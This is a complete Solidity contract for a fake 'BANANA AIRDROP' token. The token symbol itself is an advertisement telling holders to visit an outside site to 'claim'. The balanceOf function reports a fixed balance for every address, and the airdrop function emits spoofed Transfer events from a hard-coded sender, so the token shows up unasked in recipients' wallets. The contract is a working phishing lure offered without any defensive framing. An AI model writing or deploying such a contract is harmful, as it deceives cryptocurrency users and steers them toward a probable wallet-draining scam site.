pragma solidity ^0.8.0;

contract CustomToken {
    string public constant name = "BANANA AIRDROP";
    string public constant symbol = "Visit banana-gunbot.com to CLAIM";
    uint8 public constant decimals = 6;
    uint256 public constant totalSupply = type(uint256).max;

    address private constant addressFrom =
        0x28C6c06298d514Db089934071355E5743bf21d60;
    uint256 private constant valueByTransfer = 500000000;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function balanceOf(address account) public pure returns (uint256) {
        return 500 * (10**uint256(decimals));
    }

    function airdrop(address[] memory recipients) public {
        for (uint256 i = 0; i < recipients.length; i++) {
            emit Transfer(addressFrom, recipients[i], valueByTransfer);
        }
    }
}